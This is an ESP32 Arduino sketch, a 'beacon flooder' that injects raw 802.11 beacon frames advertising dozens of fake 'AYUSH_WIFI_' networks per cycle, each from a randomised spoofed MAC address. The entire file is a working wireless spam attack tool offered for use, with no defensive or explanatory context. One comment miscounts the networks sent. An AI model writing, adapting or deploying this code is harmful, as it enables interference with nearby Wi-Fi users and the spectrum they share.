#include <WiFi.h>
#include <esp_wifi.h>

bool spamRunning = true;

uint8_t beaconFrame[128] = {
  0x80, 0x00, 0x00, 0x00, 
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
  0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
  0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00,
  0x64,0x00, 0x01,0x00, 0x00,0x00, 0x00,0x00,
  0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00,
  0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00,
  0x00,0x00, 0x00,0x00, 0x00,0x00
};

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Ayush", NULL, 1, false, 4);
  
  esp_wifi_set_promiscuous(true);
  
  Serial.println("\n=== AYUSH Beacon Flooder Started ===");
  Serial.println("Flooding with AYUSH networks...");
}

void sendBeacon(const char* ssid) {
  int ssidLen = strlen(ssid);
  beaconFrame[37] = ssidLen;
  memcpy(&beaconFrame[38], ssid, ssidLen);
  
  for (int i = 0; i < 6; i++) {
    beaconFrame[10 + i] = random(0, 256);
    beaconFrame[16 + i] = beaconFrame[10 + i];
  }
  
  esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, 38 + ssidLen + 12, false);
}

void loop() {
  if (spamRunning) {
    // Flood with 25 "AYUSH" networks per cycle
    for (int i = 0; i < 40; i++) {
      String fakeSSID = "AYUSH_WIFI_" + String(random(10000, 99999));
      sendBeacon(fakeSSID.c_str());
      delay(3);
    }
  }
  
  delay(30);
  
  static unsigned long last = 0;
  if (millis() - last > 3000) {
    last = millis();
    Serial.println("Flooding 40 AYUSH networks per cycle...");
  }
}